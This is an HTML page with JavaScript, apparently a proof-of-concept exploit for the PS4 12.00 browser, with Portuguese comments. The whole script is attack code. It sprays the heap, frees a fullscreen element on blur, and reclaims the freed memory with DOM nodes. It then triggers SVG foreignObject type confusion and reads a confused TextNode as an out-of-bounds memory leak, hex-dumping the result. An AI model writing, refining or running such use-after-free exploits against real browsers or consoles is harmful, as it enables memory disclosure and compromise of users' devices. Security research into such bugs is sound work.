
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - OOB Read Memory Dumper</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → OOB Read → Memory Dumper</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP ORIGINAL (100% INALTERADO)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]= 0x1337BEEF; // Usamos uma assinatura mágica fácil de achar na memória
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 OOB READ PROBE (O RADAR)
function domOverlapProbe(fsTarget){
    log("---- MEMORY DUMP PROBE ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION (Preparando Leitura...)");

            try{
                // Em vez de ESCREVER, nós LEMOS o que o TextNode confuso acha que é o texto dele!
                let leakedData = n.data; 
                
                if(!leakedData){
                    log("[SCAN] Vazamento vazio (null/undefined)");
                    return;
                }

                log("[LEAK] Tamanho do buffer vazado: " + leakedData.length + " bytes");

                if(leakedData.length > 10){
                    // Transforma os primeiros 50 caracteres do vazamento em códigos Hexadecimais para analisarmos
                    let hexDump = [];
                    for(let i=0; i < Math.min(leakedData.length, 50); i++){
                        hexDump.push(leakedData.charCodeAt(i).toString(16).padStart(4, '0'));
                    }
                    
                    log("[DUMP] " + hexDump.join(" "));

                    // Procura por assinaturas conhecidas no texto vazado
                    if(leakedData.includes("CONTROL")){
                        log("[$$$] Lendo memória do RECLAIM (DOM Vizinho!)");
                    }
                    
                    // Nota: 0x1337BEEF em floats ou ponteiros vai parecer lixo, 
                    // mas podemos analisar o hexDump depois.
                }

            }catch(e){
                log("[UAF] read crash");
            }
        }
    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste (Memory Dump)...");
    
    // Mantém a pressão de memória
    window.heap_press = setupHeap(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
